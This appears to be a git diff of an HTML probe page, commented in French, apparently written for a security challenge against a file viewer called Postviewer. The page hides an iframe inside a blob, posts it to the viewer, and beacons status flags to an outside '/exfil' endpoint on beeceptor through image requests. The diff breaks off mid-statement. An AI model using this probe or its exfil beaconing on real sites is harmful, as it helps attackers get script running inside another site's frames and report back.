@@ -2,34 +2,39 @@
 <html>
 <body>
 <script>
-/* ping : page externe chargée */
-new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=outer_loaded';
+/* Ping immédiat : la page GitHub est chargée */
+new Image().src =
+  'https://webtest.free.beeceptor.com/exfil?f=outer_loaded';
+
+/* Écoute tous les messages venant du Safe-Frame */
+window.addEventListener('message', ev => {
+  if (ev.data === 'blob_start') {
+    new Image().src =
+      'https://webtest.free.beeceptor.com/exfil?f=blob_start';
+  }
+});
 
 (async () => {
-  /* HTML du blob — AUCUN script direct, seulement un iframe srcdoc */
+  /* Blob HTML : pas de <script> inline, uniquement un iframe srcdoc */
   const epic = `
-    <html><body>
-      <iframe style="display:none"
+    <html><body style='margin:0'>
+      <iframe sandbox="allow-scripts allow-same-origin"
+              style="border:0;width:0;height:0"
               srcdoc="
-                <script>
-                  parent.postMessage('blob_start','*');
-                <\/script>
+                 <script>
+                   /* Signale au top : le blob s’exécute bien */
+                   top.postMessage('blob_start','*');
+                 <\/script>
               ">
       </iframe>
     </body></html>`;
 
-  const blob = new Blob([epic], {type:'text/html'});
+  const blob = new Blob([epic], { type: 'text/html' });
 
-  window.addEventListener('message', e => {
-    if (e.data === 'blob_start') {
-      new Image().src =
-        'https://webtest.free.beeceptor.com/exfil?f=blob_start';
-    }
-  });
-
+  /* Envoi du fichier à Postviewer */
   window.postMessage({
-    type:'share',
-    files:[{blob, name:'probe.html', cached:false}]
+    type: 'share',
+    files: [{ blob, name: 'probe.html', cached: false }]
   }, '*');
 
   new Image().src =
